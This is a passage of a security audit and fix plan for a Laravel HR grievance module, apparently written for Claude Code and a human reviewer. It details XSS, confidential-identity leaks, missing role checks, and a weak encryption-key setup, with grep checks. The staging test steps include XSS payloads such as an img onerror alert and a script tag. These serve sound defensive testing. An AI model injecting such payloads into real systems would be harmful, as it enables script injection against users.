| `investigationreport.blade.php:223, 226`, `Investigationinfo.blade.php:194, 197` | `inves_find_recommendations` | committee — **CKEditor rich text** (intended HTML) |
| `GrivanceController.php:1024-1026, 1035` (History & Logs DataTable) | `Grivance_Eexplination_description` returned as the `Note` column and listed in `rawColumns` | **Any employee** — plain text |

**Fix:**
1. **Plain-text fields** (`Grivance_description`, `Gm_Resoan`, `follow_up_description`): change `{!! $x !!}` to `{!! nl2br(e($x)) !!}`. This escapes the HTML and keeps line breaks. (Check `follow_up_description`'s form input first: if it's a CKEditor field, treat it like step 2 instead.)
2. **Rich-text field** (`inves_find_recommendations`): it needs *some* HTML, so it must be **sanitised**, not escaped. Add `mews/purifier` (HTMLPurifier) and render with `{!! clean($value->inves_find_recommendations) !!}`. Don't write a home-made regex sanitiser.
3. **History & Logs DataTable** (`GrivanceController.php:1035`): remove `'Note'` from `rawColumns` (DataTables then escapes it). The `Employee_Name` column (998-1006) builds HTML from names. Wrap the name parts in `e()` while you're on that line.
4. **Same-page siblings (invariant #7):** grep every grievance/appeal Blade view and every grievance `rawColumns` list for other raw user text. Only the lines above were found in the audit, but confirm.

**VERIFY:**
```bash
grep -rnE "\{!!\s*\\\$(Grivance_Parent->(Grivance_description|Gm_Resoan)|value->follow_up_description)\s*!!\}" resources/views/resorts/GrievanceAndDisciplinery/
```
Expected: *(no output)*
```bash
grep -rn "inves_find_recommendations" resources/views/resorts/GrievanceAndDisciplinery/grivance/*.blade.php | grep "{!!" | grep -v "clean("
```
Expected: *(no output)*
```bash
sed -n '/function HistoryAndLogs/,/function GrivnanceDestory/p' app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php | grep rawColumns
```
Expected: the list no longer contains `'Note'`.

**`HUMAN` browser test on staging (required):** submit a grievance from the mobile app with description `<img src=x onerror=alert('XSS-desc')>` and explanation `<img src=x onerror=alert('XSS-note')>`. As HR, open (a) the Investigation Report page, (b) the View Report page, (c) History & Logs after resolving it. **No alert box may appear**; the text must show literally as `<img src=x …>`. Also enter `<b>bold</b><script>alert(1)</script>` in a committee recommendation (CKEditor): the bold stays, the script is gone, no alert.

---

### S2-05 · HIGH · Confidential grievant's identity leaks

**What it is:** employees can file a grievance as **Confidential** (`Grivance_Submission_Type = "Yes"`). The main list and investigation pages correctly hide the name unless the grievant approved disclosure (`GrivanceController.php:458`, `:829`; list at `:190-207`). Three other paths ignore that flag:

| # | Where | What leaks | Status |
|---|---|---|---|
| a | **History & Logs** — `GrivanceController::HistoryAndLogs()`, `:949-1006` | Grievant's **name, photo, department, section, position** for every resolved grievance, confidential or not. There's no `Grivance_Submission_Type` check anywhere in the method. The route (`GrievanceAndDisciplinery.Disciplinary.HistoryAndLogs`) isn't in `module_pages`, so any portal user can open it. | CONFIRMED |
| b | **Mobile push to HR** — `API/GrievanceController.php:258` | Notification text is `'A grievance submission has been sent by ' . first_name . ' ' . last_name`, sent even when `Confidential = option1`. The web submission path (`GrivanceController.php:384`) correctly omits the name. | CONFIRMED |
| c | **Attachment storage** — `API/GrievanceController.php:227` | Mobile attachments are stored with `Common::AWSEmployeeFileUpload($resort_id, $file, <grievant's Emp_id>, "GrivanceAttachments", true)`. That helper (`app/Helpers/Common.php:8968+`) files them in a `GrivanceAttachments` sub-folder **inside the grievant's own personal employee folder** in File Management. Anyone who can browse employee folders sees which employee has grievance attachments. | LIKELY — confirm who can browse another employee's folder in File Management |

**Fix:**
- **a:** In `HistoryAndLogs()`, apply the same rule the main list uses: for rows where `Grivance_Submission_Type == 'Yes'` and the viewer's employee id isn't in `Identity_Disclosed_To`, return `Confidential` for the name, and a blank avatar, department, section and position. Reuse the logic from `GrivanceIndex` (`:190-207`). Don't write a second version of the rule.
- **b:** Build the message the way the web path does: no name when the submission is confidential (keep the name for non-confidential if HR wants it).
- **c:** Store grievance attachments in a resort-level grievance folder (not tied to the employee), the same way the web path does: `StorageHelper::put(config('settings.GrivanceAttachments').'/'.$resort_id.'/'.$Grivance_id.'/…')` at `GrivanceController.php:355-363`. Existing files already in employee folders need a one-off move (migration or command), which Ankit decides on. **Coordinate with S2-07**: these files are "secure" (encrypted) uploads.

**VERIFY:**
- a: in tinker, run `HistoryAndLogs` as an HR user with a resolved **confidential** grievance in the data (create one inside a transaction if none exists), decode the JSON, and confirm that row's `Employee_Name` contains `Confidential` and not the real name. Paste the row. A non-confidential row must still show the name.
- b: `grep -n "grievance submission has been sent by" app/Http/Controllers/API/GrievanceController.php`, then show the surrounding code: the name must only be added inside a non-confidential branch.
- c: `HUMAN` answers: "Can a non-HR portal user browse another employee's personal folder in File Management? yes/no". Then after the fix, submit a confidential grievance with an attachment from the mobile app and confirm **no** new file appears in the grievant's personal folder.

---

### S2-06 · HIGH · No role checks — any portal user can run committee / GM / HR actions

**What it is:** because of X-01, the portal's middleware lets every grievance route through except the 4 listed ones. Checks inside the methods are missing or also point at unlisted routes. So **any employee with a portal login in the resort** (a line supervisor, or the manager the grievance is *about*) can:

| Action | Method | Inside-method check today |
|---|---|---|
| Open **any** grievance's full investigation report / view report (description, attachments, witnesses, committee notes; name too if not confidential) | `InvestigationReport` `:398`, `Investigationinfo` `:757` | none |
| Assign a committee; record the **GM decision**; mark resolved | `InvestigationReportStore` `:471` | only the committee-member check on the edit branch |
| Request witness statements | `RequestForStatement` `:886` | none |
| **Delete** a grievance | `GrivnanceDestory` `:1044` | none (the delete-permission check at `:137` only hides the button in the list) |
| Change **key personnel** (the people allowed to ask for a confidential grievant's identity) | `ConfigurationController::KeyPersonnel` `:1720` | none |
| Create / edit / delete **grievance committees** (e.g. add themselves to one) | `GrievanceCommitteeStore` `:3314`, `GrivanceCommitteeinlineUpdate` `:3444` | none |
| All other grievance settings (categories, templates, rules) | `ConfigurationController` | none — the controller has **0** permission checks |
| **Decide an appeal**, including the person who filed it, deciding their own | `GrievanceAppealController::decide` `:273` (also `storeHearing`, `updateHearingStatus`) | `loadAppealForWrite` checks `edit` permission on `Appeals.Index`, **which isn't listed, so it always passes** |
| File an appeal against **any** grievance in the resort, not just their own | `GrievanceAppealController::store` `:115` | none |

The realistic abuse is inside one resort: the accused manager reads the complaint and witness list against them, adds themselves to the committee, or deletes the case. For an international client, this is the sort of finding that fails an HR-system audit.

**Fix (grievance-local; don't wait for X-01):**
1. Add one private helper **per controller** (or a shared one in `Common.php` if Ankit prefers) that answers "is this user HR-equivalent?" using the rule `GrievanceAppealController::isHrEquivalent()` (`:344-354`) already implements: rank 3 / HR, rank 8 / GM, HR-department rank 1-2, master admin. **Reuse it. Don't invent a new rule.**
2. Gate each action:
   - **HR-equivalent only:** all `ConfigurationController` grievance methods, `KeyPersonnel`, `GrivnanceDestory`, `RequestForStatement`, the `AssignToComittee` branch, appeal `decide` / `storeHearing` / `updateHearingStatus`.
   - **GM (rank 8) or HR-equivalent only:** the GM-decision branch of `InvestigationReportStore` (confirm with Ankit whether HR may record a GM decision on the GM's behalf).
   - **HR-equivalent OR a member of the grievance's assigned committee:** `InvestigationReport`, `Investigationinfo`, the `EditModeForCommittee` branch (it already checks membership. Keep that and add the HR-equivalent bypass only if HR should also be able to edit).
   - **Appeal `store`:** the grievant (`created_by` / `Employee_id` of the grievance) or HR-equivalent.
   - **Appeal `decide`:** additionally refuse when `$appeal->submitted_by` is the current user's employee id.
3. Return `403` JSON for AJAX routes and `abort(403)` for page routes, matching each method's existing style.

**VERIFY:** for each row in the table, pick a portal user of the **same** resort who is **not** HR, GM or a committee member (rank 1-2 outside HR, or any rank-4+ portal user). Call the method with the §0.5 harness pattern (same resort this time) → expect `403`, and the record unchanged. Then repeat as an HR user → expect success. Paste a table: `Action | non-HR result | HR result`. Also: the appeal's own submitter calling `decide` on their own appeal → `403`.

---

### S2-07 · HIGH · "Secure" file encryption key read with `env()` — likely empty in production (affects all modules)

**Where:** `env('ENCRYPTION_KEY')` is called directly **17 times** in:
`app/Helpers/Common.php` (e.g. inside `AWSEmployeeFileUpload`, `:8968+`), `app/Helpers/EmployeeDocumentFiler.php`, `app/Http/Controllers/Resorts/FileManagment/FileManageController.php`, `app/Http/Controllers/Resorts/Visa/XpactEmployeeController.php`, `app/Http/Controllers/Resorts/People/Transfer/TransferController.php`.
The key is derived as `hash('sha256', env('ENCRYPTION_KEY'), true)` and used for AES-256 on every "secure" upload: grievance attachments, visa/passport documents, employee documents.

**Why it matters:**
- `ENCRYPTION_KEY` is **not defined in any `config/*.php` file**, and **not present in `.env.example` or `.env.staging`**.
- In Laravel, once `php artisan config:cache` has run (standard in production), `env()` **returns `null` everywhere outside config files**.
- In either case (never set, or config cached), the key becomes `sha256("")`, a **publicly known constant**. The "encrypted" passports and grievance files are then encrypted with a key anyone can calculate, so the encryption protects nothing if the Wasabi bucket or its credentials ever leak.

**Fix — `HUMAN` first (decides the path):**
1. On the production box: is `ENCRYPTION_KEY` set in `.env` (report length only: `grep -c '^ENCRYPTION_KEY=.\+' .env`)? Is config cached (`ls bootstrap/cache/config.php`)?
2. **If files have been encrypted with `sha256("")`** (key unset, or config cached): **changing the key breaks decryption of every existing secure file.** The fix must include a fallback: try the real key, and if decryption fails, try the legacy empty-string key. Then run a one-off re-encryption command. Ankit plans this; don't do it blindly.

**Fix — code:**
1. Add `'encryption_key' => env('ENCRYPTION_KEY'),` to `config/app.php` (or a dedicated config file), and replace all 17 `env('ENCRYPTION_KEY')` calls with `config('app.encryption_key')`.
2. Fail loudly: if the configured key is empty, throw instead of silently encrypting with an empty key.
3. Add `ENCRYPTION_KEY=` (empty placeholder) to `.env.example`.
4. **Other `env()` calls outside `config/`:** there are 52 in `app/`, `routes/`, `resources/views/`. They have the same "null in production" problem. List them in §9. Don't fix them in this issue.

**VERIFY:**
```bash
grep -rn "env('ENCRYPTION_KEY')" app routes resources
```
Expected: *(no output)*
```bash
php artisan config:cache && php artisan tinker --execute="echo strlen((string) config('app.encryption_key')) > 0 ? 'KEY LOADED WITH CONFIG CACHED' : 'KEY EMPTY';" ; php artisan config:clear
```
Expected: `KEY LOADED WITH CONFIG CACHED` (on a box whose `.env` has the key).
- Round trip: upload a secure file (e.g. a grievance attachment from the mobile app on staging), then open or download it in the portal. It must display correctly. **If S2-07 includes the legacy fallback**, also open a secure file uploaded **before** the change and confirm it still opens.

---

### S2-08 · MEDIUM · Investigation files overwrite each other; web uploads accept any file type

**Where:**
- `GrivanceController.php:656-661` stores committee investigation files at `config('settings.GrievanceSubmission').'/'.<resort_id>.'/'.<original file name>`, **one folder for the whole resort**. Two grievances that each upload `report.pdf` → the second overwrites the first. Both cases then point at the same file, and **grievance A's page serves grievance B's evidence**. `API/GrievanceController.php:411-433` (`resolvePlainFileUrls`) reads from the same shared folder.
- No file-type or size validation on the web uploads: `GrievanceSubmiteStore` (`:357-365`, `Attachments`) and `InvestigationReportStore` (`:648-662`, `investigation_file`). Any file type, including `.html` / `.svg` / `.php`, is accepted. The mobile witness path already validates (`API/GrievanceController.php:793`). Copy that list.

**Fix:**
1. Store investigation files under a per-grievance path and with a unique name, the way the mobile witness path does (`time() . '_' . name`, `API/GrievanceController.php:815`): e.g. `.../<resort_id>/<Grivance_id>/investigation/<unique>_<name>`. Update the readers (`resolvePlainFileUrls`, and the investigation views' file links) to match. Existing rows need the old path as a fallback.
2. Add `'Attachments.*' => 'file|max:<limit>|mimes:jpeg,png,jpg,heic,heif,mp4,mov,doc,docx,pdf,mp3,m4a,wav,aac,ogg'` and the same for `investigation_file.*`.

**VERIFY:** on staging, upload `report.pdf` (content A) to grievance 1's investigation, then a different `report.pdf` (content B) to grievance 2. Download from grievance 1 → still content A. Try uploading `test.html` to both web forms → rejected with a 422 validation error. Paste the storage paths of both files.

---

### S2-09 · MEDIUM · DECISION NEEDED — grievant's app shows witness statements and internal committee notes

**Where:** `API/GrievanceController::grievanceDetail()` — `API/GrievanceController.php:510-642`. It's correctly scoped (only the grievant's own grievance), but it returns to the **grievant**:
- every witness's **name, photo, written statement and attachments** (`:529-547`)
- the committee's internal timeline: **recommendations, follow-up actions, resolution notes, and which committee member wrote each** (`:555-581`)

**Why it's flagged:** in most HR grievance procedures, witness statements and internal committee deliberations are **not** shown to the complainant, because it exposes witnesses to pressure or retaliation. This may be a deliberate product choice, which is why it's a decision item, not a bug.

**Action:** `HUMAN` (product owner or HR lead) decides and records the answer here: "Grievant may see: witness names yes/no, statements yes/no, committee notes yes/no". Claude Code then removes the disallowed fields from the response. The mobile app must handle their absence, so check with the app developer.

**VERIFY:** after the decision, call `grievanceDetail` for a grievance with witnesses and investigation entries and paste the JSON keys. The removed fields must be absent.

---

### S2-10 · LOW · Grievance numbers are one global sequence across all resorts

**Where:** `Common::getGriveanceID()` (`app/Helpers/Common.php:7877`) takes the **latest grievance in the whole table**, across every resort, and adds 1 (`GR-0001`, `GR-0002`, …).

**Why it matters:** (1) a user in one resort can estimate **how many grievances exist system-wide** from the gaps between their own numbers, which is business information another client shouldn't see; (2) it's what made S2-02 exploitable by number; (3) two grievances submitted at the same moment can get the **same** number (read-then-write race).

**Fix:** generate the number per resort (filter by `resort_id`), and protect it with a unique index on `(resort_id, Grivance_id)` via a **migration**. Existing numbers stay as they are. `HUMAN`: confirm nothing outside the app (reports, printed letters) depends on numbers being globally unique.

**VERIFY:** in tinker, inside a transaction, create a grievance in resort A and one in resort B. The numbers are generated independently (B's doesn't follow A's). `SHOW INDEX FROM grivance_submission_models` lists the new unique index.

---

### S2-11 · LOW · Mobile witness-statement lookup not scoped (safe today)

**Where:** `API/GrievanceController.php:826` — `GrivanceSubmissionModel::find($request->grievance_id)`.

**Correction to an earlier chat claim:** this was reported as a minor cross-resort read. On closer tracing it's **not exploitable today**: it only runs after `:803-809` has proved the caller is a registered witness on that grievance, and witnesses can only be added from the caller's own resort. It's still worth scoping in case that earlier check is ever changed. The `exists:grivance_submission_models,id` rule at `:791` has the same gap.

**Fix:** add `->where('resort_id', $this->resort_id)` to line 826, and change the `:791` rule to `Rule::exists('grivance_submission_models','id')->where('resort_id', $this->resort_id)`.

**VERIFY:**
```bash
sed -n 785,830p app/Http/Controllers/API/GrievanceController.php | grep -nE "find\(|exists:"
```
Expected: *(no output)* — both replaced by scoped versions.

---

### X-01 · HIGH · DECISION NEEDED · Portal permission check allows every unlisted route

**Where:** `Common::checkRouteWisePermission()` (`app/Helpers/Common.php`), called for every portal request by `app/Http/Middleware/CheckResortPermission.php`:
```php
if(!$pagesList){
    return true; // No page found for this route
}
```
Also: the middleware always checks the **view** permission, even for create/edit/delete routes.

**Scale:** about **140 of the 1,544** named portal routes appear in `module_pages` seeders/migrations, so **about 91% of portal routes skip the role/permission system**. They rely only on whatever each method checks itself, which in the grievance module was almost nothing (S2-06). This figure comes from the repo's seeders; the live `module_pages` table may contain more rows. `HUMAN` confirms with a read-only query:
```php
php artisan tinker --execute="echo \App\Models\ModulePages::whereNotNull('internal_route')->distinct('internal_route')->count('internal_route');"
```

**Why it's a decision, not a quick fix:** flipping the default to "deny" would instantly **lock users out of about 1,400 routes** (every AJAX endpoint, every detail page) and take the portal down. Options, for Ankit to choose:
- **A (recommended):** keep the default, and fix each module's sensitive actions with explicit in-method role checks during the module sweep (as S2-06 does for grievance). Safe, gradual.
- **B:** list every route in `module_pages` with the right permission, then flip to deny-by-default. Correct in the end, but a large project with outage risk.
- **C:** a middle path: deny-by-default only for `POST`/`PUT`/`DELETE` routes not listed, after an audit of which ones legitimately need to stay open.

**Action:** Ankit records the choice here. The module-by-module sweep (Stage 6+) will list each module's unprotected sensitive actions either way.

---

### Stage 2 — checked and found clean

So Claude Code doesn't spend time re-auditing these:
- Grievance **delete** (`GrivnanceDestory`) and **RequestIdentity** are correctly scoped to the resort (`GrivanceController.php:1050`, `:843`). *Role* checks are still missing (S2-06).
- **PDF download** (`downloadGrievanceReportPdf`, `:1085-1118`) is scoped, and `report_pdf.blade.php` has no unescaped output.
- **Web employee lookup / grievance create** check that the employee and witnesses belong to the resort (`:256-322`).
- **All Appeals reads and writes** are resort-scoped (`GrievanceAppealController.php:38-61`, `:330-342`), and hearing participants are validated per resort (`:204-207`). Role checks → S2-06.
- **Mobile API**: `GetEmployeeDetails`, categories, `GrievanceStore` (submitter forced to the logged-in employee; witnesses validated per resort), `myGrievances`, `grievanceDetail`, `respondIdentityDisclosure`, `witnessStatementRequest` are all scoped to the caller's resort **and** their own records.
- **Committee** create / edit / delete and **key-personnel** save validate resort ownership (`ConfigurationController.php:1720-1745`, `:3444+`, `:3538+`). Role checks → S2-06.
- Main grievance list and both investigation pages hide a confidential grievant's name, phone and photo correctly (`$canViewIdentity`).

### Stage 2 — non-security bugs noticed (for Ankit's backlog, not part of this security work)

| File:line | Bug |
|---|---|
| `routes/resort_route.php:1201` | The **delete committee** route points to `GrivanceController@GrivevanceCommitteesDestory`, but that method lives in `ConfigurationController` (`:3538`). Deleting a committee from the UI always fails with a 500. |
| `GrivanceController.php:424-434` | `InvestigationReport()` has no "not found" guard (its sibling `Investigationinfo()` has one at `:800-802`). An unknown or foreign ID gives a 500 instead of a 404. Not a leak, since it crashes before rendering. |
## 4. STAGE 3 — Super-admin support view XSS  ·  PENDING AUDIT
## 5. STAGE 4 — Passport token expiry  ·  PENDING AUDIT
## 6. STAGE 5 — CORS  ·  PENDING AUDIT
## 7. STAGE 6+ — Module-by-module sweep  ·  PENDING AUDIT

---

## 9. FOUND WHILE FIXING (Claude Code appends here — do not fix in the same change)

| Found during | File:line | What | Severity guess |
|---|---|---|---|
| | | | |
